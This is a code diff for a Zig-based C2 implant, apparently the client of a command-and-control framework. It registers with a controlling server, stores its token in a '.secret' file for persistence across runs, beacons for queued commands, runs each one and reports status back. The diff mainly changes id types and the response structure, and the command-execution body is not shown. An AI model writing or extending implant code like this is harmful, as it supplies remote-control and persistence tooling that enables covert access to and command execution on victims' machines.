@@ -13,8 +13,8 @@ const Implant = struct {
     };
 
     const Command = struct {
-        id: []const u8,
-        implantId: []const u8,
+        id: u32,
+        implantId: u32,
         type: []const u8,
         status: CommandStatus,
         payload: std.json.Value,
@@ -36,7 +36,23 @@ const Implant = struct {
         return error.ImplantNotRegistered;
     }
 
+    fn readJWTFromFile(self: *Implant) !bool {
+        std.fs.cwd().access(".secret", .{}) catch return false;
+        const jwt = try std.fs.cwd().readFileAlloc(self.allocator, ".secret", 1024);
+        self.jwt = jwt;
+        return true;
+    }
+
+    fn writeJWTToFile(self: *Implant) !void {
+        const jwt = try self.getJWT();
+        var file = try std.fs.cwd().createFile(".secret", .{});
+        defer file.close();
+        try file.writeAll(jwt);
+    }
+
     fn register(self: *Implant) !void {
+        if (try self.readJWTFromFile()) return;
+
         const url = try std.fs.path.join(self.allocator, &.{ self.server_url, "implants" });
         defer self.allocator.free(url);
         const uri = try std.Uri.parse(url);
@@ -66,7 +82,7 @@ const Implant = struct {
             message: []const u8,
             token: []const u8,
             implant: struct {
-                id: []const u8,
+                id: u32,
                 lastSeenAt: []const u8,
             },
         };
@@ -74,9 +90,10 @@ const Implant = struct {
         const parsed_body = try std.json.parseFromSlice(T, self.allocator, body, .{});
         defer parsed_body.deinit();
 
-        std.debug.print("Implant Id: {s}\n", .{parsed_body.value.implant.id});
+        std.debug.print("Implant Registerd with Id: {d}\n", .{parsed_body.value.implant.id});
 
         self.jwt = try self.allocator.dupe(u8, parsed_body.value.token);
+        try self.writeJWTToFile();
     }
 
     fn beacon(self: *Implant) !void {
@@ -115,8 +132,11 @@ const Implant = struct {
         const T = struct {
             success: bool,
             message: []const u8,
-            implant: struct { id: []const u8, lastSeenAt: []const u8 },
-            commands: []Command,
+            implant: struct {
+                id: u32,
+                lastSeenAt: []const u8,
+                commands: []Command,
+            },
         };
 
         const parsed_body = try std.json.parseFromSlice(T, self.allocator, body, .{
@@ -124,7 +144,7 @@ const Implant = struct {
         });
         defer parsed_body.deinit();
 
-        for (parsed_body.value.commands) |command| {
+        for (parsed_body.value.implant.commands) |command| {
             try self.executeCommand(command);
         }
     }
@@ -159,7 +179,10 @@ const Implant = struct {
     fn setCommandStatus(self: *Implant, command: Command, commandStatus: CommandStatus, response: anytype) !void {
         const jwt = try self.getJWT();
 
-        const url = try std.fs.path.join(self.allocator, &.{ self.server_url, "commands", command.id, "status" });
+        const command_id = try std.fmt.allocPrint(self.allocator, "{}", .{command.id});
+        defer self.allocator.free(command_id);
+
+        const url = try std.fs.path.join(self.allocator, &.{ self.server_url, "commands", command_id, "status" });
         defer self.allocator.free(url);
         const uri = try std.Uri.parse(url);
 
